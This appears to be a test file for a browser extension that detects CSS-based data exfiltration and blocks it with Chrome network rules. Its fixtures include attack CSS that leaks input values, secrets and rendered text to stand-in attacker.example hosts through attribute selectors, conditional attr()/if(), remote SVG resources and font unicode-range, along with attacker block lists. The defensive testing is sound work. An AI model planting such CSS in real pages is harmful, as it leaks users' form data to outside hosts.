import { describe, expect, it } from "vitest";
import { applyGlobalPolicyDnrRules, applyTabPolicyDnrRules, blockHighConfidenceFindingUrls, clearTabDnrRules, destinationPolicyForUrl, getDnrStatus, setStrictThirdPartyRule } from "../../../src/browser/dnr/chromeDnr";
import { DEFAULT_SITE_POLICY } from "../../../src/shared/constants";
import { getSitePolicy } from "../../../src/browser/storage/reports";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import { scanHtmlResourceAttributes } from "../../../src/browser/scanner/htmlResourceScan";
import type { Finding, SitePolicy } from "../../../src/shared/types";
import { getMockSessionRules, initiatorDomains, regexFilter, resourceTypes, ruleAction, ruleId, rulePriority, setMockUpdateSessionRulesFailure, tabIds, domainType } from "../../setup/dnr-test-helpers";

describe("DNR browser integration", () => {
  it("creates DNR rules for high confidence findings and strict third-party blocking", async () => {
    const finding = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" }).findings[0] as Finding;
    const result = await blockHighConfidenceFindingUrls([finding], 1);
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
    const policy = await getSitePolicy();
    await setStrictThirdPartyRule(1, true, { ...policy, mode: "strict" }, "https://app.example/");
    expect(getMockSessionRules().length).toBeGreaterThan(0);
  });

  it("enforces destination policy precedence for DNR findings and policy rules", async () => {
    const finding = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" }).findings[0] as Finding;
    const allowedPolicy: SitePolicy = { ...DEFAULT_SITE_POLICY, allowlistedOrigins: ["https://attacker.example"] };
    const allowed = await blockHighConfidenceFindingUrls([finding], 7, allowedPolicy);
    expect(allowed.blockedFindings.size).toBe(0);
    expect(allowed.skippedAllowedUrls).toContain("https://attacker.example/a");

    const blockedPolicy: SitePolicy = { ...DEFAULT_SITE_POLICY, allowlistedOrigins: ["https://attacker.example"], blocklistedOrigins: ["https://attacker.example"] };
    const blocked = await blockHighConfidenceFindingUrls([finding], 8, blockedPolicy);
    expect(blocked.blockedFindings.has(finding.id)).toBe(true);
    expect(destinationPolicyForUrl("https://attacker.example/a", blockedPolicy).action).toBe("block");
  });

  it("installs tab-scoped allow, block, and strict rules with documented precedence", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      allowlistedOrigins: ["https://cdn.example"],
      blocklistedOrigins: ["https://attacker.example"],
      compatibility: { ...DEFAULT_SITE_POLICY.compatibility, enableStrictThirdPartyBlocking: true }
    };
    const result = await applyTabPolicyDnrRules(13, "https://app.example/", policy, true);
    expect(result.strictThirdPartyRule).toBe(true);
    expect(result.policyRuleCount).toBe(3);

    const rules = getMockSessionRules();
    expect(rules.some((rule) => ruleAction(rule) === "block" && rulePriority(rule) === 6 && regexFilter(rule) === "^https://attacker\\.example/" && tabIds(rule)?.includes(13))).toBe(true);
    expect(rules.some((rule) => ruleAction(rule) === "allow" && rulePriority(rule) === 5 && regexFilter(rule) === "^https://cdn\\.example/" && tabIds(rule)?.includes(13))).toBe(true);
    expect(rules.some((rule) => ruleAction(rule) === "block" && domainType(rule) === "thirdParty" && tabIds(rule)?.includes(13))).toBe(true);
  });

  it("ignores malformed destination-policy origins before DNR rule creation", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      allowlistedOrigins: ["not a url", "javascript:alert(1)", "https://cdn.example/path"],
      blocklistedOrigins: ["", "ftp://files.example", "https://attacker.example/#fragment"],
    };

    const result = await applyGlobalPolicyDnrRules(policy);
    expect(result.policyRuleCount).toBe(2);
    expect(result.skippedAllowedUrls).toEqual(["https://cdn.example"]);
    expect(result.blockedUrls).toEqual(["https://attacker.example"]);

    const rules = getMockSessionRules();
    expect(rules.some((rule) => regexFilter(rule) === "^https://cdn\\.example/" && ruleAction(rule) === "allow")).toBe(true);
    expect(rules.some((rule) => regexFilter(rule) === "^https://attacker\\.example/" && ruleAction(rule) === "block")).toBe(true);
    expect(rules.some((rule) => regexFilter(rule)?.includes("javascript") || regexFilter(rule)?.includes("files"))).toBe(false);
  });

  it("installs global destination policy rules for first-load protection before a tab exists", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      allowlistedOrigins: ["https://cdn.example"],
      blocklistedOrigins: ["https://attacker.example"]
    };
    const result = await applyGlobalPolicyDnrRules(policy);
    expect(result.policyRuleCount).toBe(2);

    const rules = getMockSessionRules();
    expect(rules.some((rule) => ruleAction(rule) === "block" && rulePriority(rule) === 6 && regexFilter(rule) === "^https://attacker\\.example/" && tabIds(rule) === undefined)).toBe(true);
    expect(rules.some((rule) => ruleAction(rule) === "allow" && rulePriority(rule) === 5 && regexFilter(rule) === "^https://cdn\\.example/" && tabIds(rule) === undefined)).toBe(true);
  });

  it("installs optional strict SVG image-document DNR policy without enabling broad third-party blocking", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      compatibility: {
        ...DEFAULT_SITE_POLICY.compatibility,
        enableStrictThirdPartyBlocking: false,
        enableSvgImageDnrPolicy: true
      }
    };
    const result = await applyTabPolicyDnrRules(17, "https://app.example/", policy, true);
    expect(result.policyRuleCount).toBe(1);

    const rules = getMockSessionRules();
    expect(rules.some((rule) =>
      ruleAction(rule) === "block"
      && rulePriority(rule) === 3
      && domainType(rule) === "thirdParty"
      && regexFilter(rule)?.includes("svg")
      && resourceTypes(rule).includes("image")
      && tabIds(rule)?.includes(17)
    )).toBe(true);
    expect(rules.some((rule) => ruleAction(rule) === "block" && domainType(rule) === "thirdParty" && resourceTypes(rule).includes("stylesheet"))).toBe(false);
  });

  it("records DNR status after policy rule application", async () => {
    await applyGlobalPolicyDnrRules({ ...DEFAULT_SITE_POLICY, blocklistedOrigins: ["https://attacker.example"] });
    const status = await getDnrStatus();
    expect(status?.ok).toBe(true);
    expect(status?.scope).toBe("global");
    expect(status?.ruleCount).toBe(1);
  });

  it("does not use URL fragments as SVG evidence and installs exact finding rules", async () => {
    const finding = analyzeStylesheet({
      cssText: 'input[value*="a"]{background:url(https://app.example/poc.png#;base64,a)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;
    expect(finding.reasons).not.toContain("sink.svg_reference");
    const result = await blockHighConfidenceFindingUrls([finding], 31, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
    const rules = getMockSessionRules();
    expect(rules.some((rule) => regexFilter(rule) === "^https://app\\.example/poc\\.png$" && tabIds(rule)?.includes(31))).toBe(true);
  });

  it("installs finding-derived future-block rules for same-origin value-probe sinks in Balanced and Strict", async () => {
    const finding = analyzeStylesheet({
      cssText: '#exfil_test2[value*="secret"]~#exfil_img2{background-image:url(https://app.example/src/pwned2.png)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/style.css"
    }).findings[0] as Finding;
    expect(finding.severity).toBe("high");

    const balanced = await blockHighConfidenceFindingUrls([finding], 32, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
    expect(balanced.blockedFindings.size).toBe(0);
    expect(balanced.ruleInstalledFindings.has(finding.id)).toBe(true);

    const strict = await blockHighConfidenceFindingUrls([finding], 33, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
    expect(strict.blockedFindings.size).toBe(0);
    expect(strict.ruleInstalledFindings.has(finding.id)).toBe(true);
  });

  it("installs finding-derived future-block rules for declaration-level attr()/if() exfil sinks", async () => {
    const finding = analyzeStylesheet({
      cssText: 'div{--user:attr(data-user);background:image-set(if(style(--user:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}',
      pageUrl: "https://app.example/",
      sourceKind: "inline_style",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;
    expect(finding.reasons).toContain("css.value.attr_source");
    expect(finding.reasons).toContain("css.value.conditional_if");
    const result = await blockHighConfidenceFindingUrls([finding], 34, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
  });

  it("installs finding-derived future-block rules for cross-origin SVG resource sinks in Balanced", async () => {
    const documentRef = new DOMParser().parseFromString(`
      <!doctype html>
      <html><body>
        <svg width="1" height="1">
          <filter id="leak"><feImage href="https://attacker.example/svg-feimage.png"></feImage></filter>
          <rect filter="url(https://attacker.example/filter.svg#x)"></rect>
          <animate attributeName="fill" values="url(https://attacker.example/fill.svg#x)"></animate>
        </svg>
      </body></html>
    `, "text/html");
    const summary = scanHtmlResourceAttributes({
      documentRef,
      pageUrl: "https://app.example/",
      frameUrl: "https://app.example/",
    });

    const svgFindings = summary.findings.filter((finding) => finding.destinationOrigin === "https://attacker.example");
    expect(svgFindings.some((finding) => finding.reasons.includes("sink.svg_feimage_remote"))).toBe(true);
    expect(svgFindings.some((finding) => finding.reasons.includes("sink.svg_resource_remote"))).toBe(true);
    expect(svgFindings.some((finding) => finding.reasons.includes("sink.svg_animate_remote"))).toBe(true);

    const result = await blockHighConfidenceFindingUrls(svgFindings, 35, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
    expect(result.ruleInstalledFindings.size).toBe(svgFindings.length);
    expect(result.ruleInstalledUrls).toEqual(expect.arrayContaining([
      "https://attacker.example/svg-feimage.png",
      "https://attacker.example/filter.svg",
      "https://attacker.example/fill.svg",
    ]));
    expect(result.ruleInstalledUrls.some((url) => url.includes("#"))).toBe(false);
    const installedRules = getMockSessionRules();
    expect(installedRules.some((rule) => regexFilter(rule)?.includes("#x"))).toBe(false);
  });


  it("installs finding-derived future-block rules for high-confidence rendered-text fingerprinting findings when the experimental guard reports them", async () => {
    const finding = analyzeStylesheet({
      cssText: '@font-face{font-family:"RenderedLeak";src:url("https://attacker.example/rendered.woff2");unicode-range:U+0041}.secret::first-line{font-family:"RenderedLeak";text-transform:uppercase}',
      pageUrl: "https://app.example/account",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/account",
      enableCssFingerprintingGuard: true,
    }).findings.find((item) => item.reasons.includes("privacy.css_fingerprinting.rendered_text_signal")) as Finding;

    expect(finding.reasons).toContain("sink.font_remote");
    expect(finding.reasons).toContain("privacy.css_fingerprinting.browser_specific_text_signal");

    const result = await blockHighConfidenceFindingUrls([finding], 37, DEFAULT_SITE_POLICY, "balanced");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
  });

  it("allocates tab-scoped DNR rule IDs without modulo collisions", async () => {
    const firstFinding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://attacker-one.example/a)}',
      pageUrl: "https://app.example/one",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/one",
    }).findings[0] as Finding;
    const secondFinding = analyzeStylesheet({
      cssText: 'input[value^="b"]{background:url(https://attacker-two.example/b)}',
      pageUrl: "https://app.example/two",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/two",
    }).findings[0] as Finding;

    await blockHighConfidenceFindingUrls([firstFinding], 1, DEFAULT_SITE_POLICY, "balanced");
    await blockHighConfidenceFindingUrls([secondFinding], 501, DEFAULT_SITE_POLICY, "balanced");
    const rules = getMockSessionRules();
    const tabOneRules = rules.filter((rule) => tabIds(rule)?.includes(1));
    const tabFiveHundredOneRules = rules.filter((rule) => tabIds(rule)?.includes(501));

    expect(tabOneRules).toHaveLength(1);
    expect(tabFiveHundredOneRules).toHaveLength(1);
    expect(ruleId(tabOneRules[0])).not.toBe(ruleId(tabFiveHundredOneRules[0]));
  });

  it("clears only the DNR rules owned by the requested tab", async () => {
    const firstFinding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://attacker-one.example/a)}',
      pageUrl: "https://app.example/one",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/one",
    }).findings[0] as Finding;
    const secondFinding = analyzeStylesheet({
      cssText: 'input[value^="b"]{background:url(https://attacker-two.example/b)}',
      pageUrl: "https://app.example/two",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/two",
    }).findings[0] as Finding;

    await blockHighConfidenceFindingUrls([firstFinding], 61, DEFAULT_SITE_POLICY, "balanced");
    await blockHighConfidenceFindingUrls([secondFinding], 62, DEFAULT_SITE_POLICY, "balanced");
    await clearTabDnrRules(61);

    const rules = getMockSessionRules();
    expect(rules.some((rule) => tabIds(rule)?.includes(61))).toBe(false);
    expect(rules.some((rule) => tabIds(rule)?.includes(62))).toBe(true);
  });

  it("scopes finding-derived DNR rules to the known initiator domain when available", async () => {
    const finding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}',
      pageUrl: "https://app.example/account",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/account",
    }).findings[0] as Finding;

    await blockHighConfidenceFindingUrls([finding], 36, DEFAULT_SITE_POLICY, "balanced");
    const rule = getMockSessionRules().find((item) => tabIds(item)?.includes(36));
    expect(initiatorDomains(rule)).toContain("app.example");
  });

  it("salvages valid DNR rules when one prepared rule is rejected", async () => {
    const validFinding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://valid-attacker.example/a)}',
      pageUrl: "https://app.example/account",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/account",
    }).findings[0] as Finding;
    const rejectedFinding = analyzeStylesheet({
      cssText: 'input[value^="b"]{background:url(https://rejected-attacker.example/b)}',
      pageUrl: "https://app.example/account",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/account",
    }).findings[0] as Finding;

    setMockUpdateSessionRulesFailure((update) => {
      return Boolean(update.addRules?.some((rule) => regexFilter(rule)?.includes("rejected-attacker")));
    });

    const result = await blockHighConfidenceFindingUrls([validFinding, rejectedFinding], 37, DEFAULT_SITE_POLICY, "balanced");
    expect(result.ok).toBe(false);
    expect(result.ruleInstalledFindings.has(validFinding.id)).toBe(true);
    expect(result.ruleInstalledFindings.has(rejectedFinding.id)).toBe(false);
    expect(result.skippedTargets).toEqual(expect.arrayContaining([expect.objectContaining({ findingId: rejectedFinding.id, reason: "rule_update_failed" })]));
    const status = await getDnrStatus();
    expect(status?.skippedTargetCount).toBeGreaterThanOrEqual(1);
    expect(status?.skippedTargetReasons?.rule_update_failed).toBeGreaterThanOrEqual(1);
    const rules = getMockSessionRules();
    expect(rules.some((rule) => regexFilter(rule)?.includes("valid-attacker"))).toBe(true);
    expect(rules.some((rule) => regexFilter(rule)?.includes("rejected-attacker"))).toBe(false);
  });

  it("surfaces DNR skipped-target diagnostics for unsupported and overlong finding URLs", async () => {
    const baseFinding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}',
      pageUrl: "https://app.example/account",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/account",
    }).findings[0] as Finding;
    const unsupportedFinding: Finding = {
      ...baseFinding,
      id: "unsupported-url-finding",
      requestUrl: "javascript:alert(1)",
      destinationUrl: "javascript:alert(1)",
      destinationOrigin: null,
    };
    const overlongFinding: Finding = {
      ...baseFinding,
      id: "overlong-url-finding",
      requestUrl: `https://attacker.example/${"a".repeat(5_000)}`,
      destinationUrl: `https://attacker.example/${"a".repeat(5_000)}`,
      destinationOrigin: "https://attacker.example",
    };

    const result = await blockHighConfidenceFindingUrls([unsupportedFinding, overlongFinding], 39, DEFAULT_SITE_POLICY, "balanced");
    expect(result.skippedTargets).toEqual(expect.arrayContaining([
      expect.objectContaining({ findingId: unsupportedFinding.id, reason: "unsupported_url" }),
      expect.objectContaining({ findingId: overlongFinding.id, reason: "url_too_long" }),
    ]));
    expect(result.message).toContain("skipped 2 DNR target(s)");
    const status = await getDnrStatus();
    expect(status?.skippedTargetCount).toBe(2);
    expect(status?.skippedTargetReasons).toEqual(expect.objectContaining({ unsupported_url: 1, url_too_long: 1 }));
  });

  it("uses requestUrl for finding-derived DNR rules when destinationUrl is unavailable", async () => {
    const baseFinding = analyzeStylesheet({
      cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;
    const finding: Finding = {
      ...baseFinding,
      destinationUrl: null,
      destinationOrigin: null,
      requestUrl: "https://attacker.example/request-url-only.png",
    };

    const result = await blockHighConfidenceFindingUrls([finding], 38, DEFAULT_SITE_POLICY, "balanced");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
    expect(result.ruleInstalledUrls).toContain("https://attacker.example/request-url-only.png");

    const rules = getMockSessionRules();
    expect(rules.some((rule) => regexFilter(rule) === "^https://attacker\\.example/request-url-only\\.png$" && tabIds(rule)?.includes(38))).toBe(true);
  });

  it("prioritizes stronger DNR candidates when the dynamic rule cap is reached", async () => {
    const remoteFindings = Array.from({ length: 55 }, (_, index) => analyzeStylesheet({
      cssText: `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background:url(https://attacker-${index}.example/leak)}`,
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding);
    const localNetworkFinding = analyzeStylesheet({
      cssText: 'input[name="api_key"][value^="x"]{background:url(http://192.168.0.12/leak)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;

    const result = await blockHighConfidenceFindingUrls([...remoteFindings, localNetworkFinding], 27);
    expect(result.ruleInstalledFindings.has(localNetworkFinding.id)).toBe(true);
    expect(result.ruleInstalledUrls).toContain("http://192.168.0.12/leak");
  });

});
